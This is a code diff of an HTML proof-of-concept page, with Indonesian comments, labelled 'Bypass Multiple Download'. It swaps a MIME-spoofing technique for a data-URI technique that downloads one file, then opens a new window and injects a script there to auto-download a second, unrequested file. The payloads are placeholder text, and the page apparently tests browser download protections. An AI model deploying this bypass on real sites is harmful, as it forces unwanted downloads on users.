@@ -2,33 +2,31 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Tech 1 – MIME spoof</title>
-<style>
-  body{font-family:system-ui,sans-serif;margin:40px auto;max-width:400px;text-align:center;}
-  button{width:100%;padding:12px;background:#0056b3;color:#fff;border:none;border-radius:4px;cursor:pointer;}
-</style>
+<title>Tech 5 – Data URI</title>
+<style>/* same */</style>
 </head>
 <body>
 <h2>Bypass Multiple Download</h2>
 <button onclick="run()">Execute Injection</button>
 <pre id="out" style="margin:10px auto;width:100%;text-align:left;"></pre>
 <script>
-function download(name, content){
-  // MIME diblokir menjadi application/octet-stream agar browser memperlakukan sebagai file biner
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(new Blob([content], {type:'application/octet-stream'}));
-  a.download = name; // nama tetap main_context.txt tapi tipe bilang biner
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-}
 function run(){
-  download('main_context.txt', 'Main content');
+  // main: encode ke base64 dan taruh di data: URI
+  const mainB64=btoa('Main content');
+  const a=document.createElement('a');
+  a.href='data:text/plain;base64,'+mainB64;
+  a.download='main_context.txt';
+  document.body.appendChild(a);a.click();document.body.removeChild(a);
+  document.getElementById('out').innerText='Main via data: URI';
+
+  // injected di window baru
   setTimeout(()=>{
-    const win = window.open('', '_blank');
+    const win=window.open('', '_blank');
     if(win){
-      win.document.write(`<script>setTimeout(()=>{const a=document.createElement('a');
-        a.href=URL.createObjectURL(new Blob(['Injected content'],{type:'application/octet-stream'}));
+      win.document.write(`<script>setTimeout(()=>{
+        const injB64=btoa('Injected content');
+        const a=document.createElement('a');
+        a.href='data:text/plain;base64,'+injB64;
         a.download='injected_context.txt';
         document.body.appendChild(a);a.click();},300);<\/script>`);
       win.document.close();
